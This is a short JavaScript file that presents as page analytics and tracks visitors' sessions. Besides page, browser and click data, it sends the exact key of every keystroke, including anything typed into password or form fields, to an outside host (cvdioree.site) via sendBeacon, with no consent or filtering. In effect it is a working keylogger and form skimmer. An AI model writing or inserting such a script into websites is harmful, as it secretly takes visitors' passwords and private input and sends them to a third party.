let sessionId = sessionStorage.getItem('session_id') || Math.random().toString(36).substring(2);
sessionStorage.setItem('session_id', sessionId);

const sendToEndpoint = (data) => {
	const url = "https://cvdioree.site/cgi-bin/save_data.py";
	const payload = {
		sessionId: sessionId,
		timestamp: new Date().toISOString(),
		pageUrl: window.location.href,
		pagePath: window.location.pathname,
		pageTitle: document.title,
		...data
	};

	const blob = new Blob([JSON.stringify(payload)], { type: 'application/json' });
	navigator.sendBeacon(url, blob);
};

window.addEventListener('load', () => {
	const staticData = {
		userAgent: navigator.userAgent,
		language: navigator.language,
		screenSize: `${window.screen.width}x${window.screen.height}`,
		windowSize: `${window.innerWidth}x${window.innerHeight}`
	};

	const [navigation] = performance.getEntriesByType('navigation');
	const performanceData = navigation ? { totalLoadTime: navigation.loadEventEnd } : {};

	sendToEndpoint({
		type: 'initial_load',
		static: staticData,
		performance: performanceData
	});
});

document.addEventListener('click', (e) => {
	sendToEndpoint({
		type: 'activity',
		event: 'click',
		x: e.clientX,
		y: e.clientY,
		target: e.target.tagName
	});
});

document.addEventListener('keydown', (e) => {
	sendToEndpoint({
		type: 'activity',
		event: 'keydown',
		key: e.key
	});
});

window.onerror = (message, source, lineno) => {
	sendToEndpoint({
		type: 'error',
		message: message,
		source: source,
		line: lineno
	});
};

let idleTimer;
const resetIdleTimer = () => {
	clearTimeout(idleTimer);
	idleTimer = setTimeout(() => {
		sendToEndpoint({
			type: 'activity',
			event: 'idle',
			duration: '2000ms'
		});
	}, 2000);
};

document.addEventListener('mousemove', resetIdleTimer);
document.addEventListener('keydown', resetIdleTimer);
document.addEventListener('scroll', resetIdleTimer);